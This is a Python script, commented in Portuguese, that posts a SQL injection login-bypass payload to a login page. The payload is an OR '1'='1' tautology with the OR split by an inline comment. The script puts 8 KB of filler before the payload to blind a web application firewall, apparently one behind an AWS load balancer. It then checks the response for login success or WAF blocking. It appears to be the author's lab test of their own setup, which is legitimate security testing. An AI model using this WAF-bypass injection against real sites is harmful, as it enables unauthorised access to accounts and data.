import urllib.request
import urllib.parse

# Configuração
# Certifique-se de que este DNS é o do seu ALB atual
url = "http://localhost/sqli-login.php" # colocar aqui a url de destino da aplicação, 
# no meu caso tenho o ambiente "localhost" e também o destino com o ALB da AWS
# "http://app-alb..."

# 1. Gerar 8KB de lixo (O Bypass do WAF)
lixo = "A" * 8192 # comente aqui caso não queira utilizar o bypass

# Ataques Baseados em Alteração de Lógica
payload_ataque = "' O/*qualquercoisa*/R '1'='1"

# 2. Construir os dados
# O 'lixo' vem primeiro para cegar o WAF.
# O payload é injetado no usuário E na senha para garantir a execução.
dados_form = [
    ('lixo', lixo), # comente essa linha caso não queira usar o bypass
    ('usuario', payload_ataque),
    ('senha', 'qualquercoisa') 
]

dados_codificados = urllib.parse.urlencode(dados_form).encode('utf-8')

print(f"[+] Enviando requisicao com {len(dados_codificados)} bytes...")
print(f"[+] Payload de teste: {payload_ataque}")

req = urllib.request.Request(url, data=dados_codificados, method='POST')

try:
    with urllib.request.urlopen(req) as response:
        html = response.read().decode('utf-8')
        
        # Verificação de Sucesso (Login)
        if "Login realizado com sucesso!" in html:
            print("\n[VITORIA] SUCESSO! O login ocorreu.")
            print("Isso indica que a injeção SQL funcionou e retornou verdadeiro/dados.")
        else:
            print("\n[FALHA] O login não ocorreu (ou deu erro 500).")
            # Imprime um pedaço do HTML para ajudar a debugar erros (ex: erro de SQL na tela)
            print("Trecho da resposta:", html[:300])
            
except urllib.error.HTTPError as e:
    print(f"\n[BLOQUEIO] O servidor retornou erro: {e.code} {e.reason}")
    if e.code == 403:
        print("O WAF bloqueou. O bypass de 8KB pode ter falhado.")
    elif e.code == 500:
        print("Erro interno do servidor. Provavelmente erro de sintaxe SQL (colunas erradas no UNION?).")
except Exception as e:
    print(f"\n[ERRO] {e}")
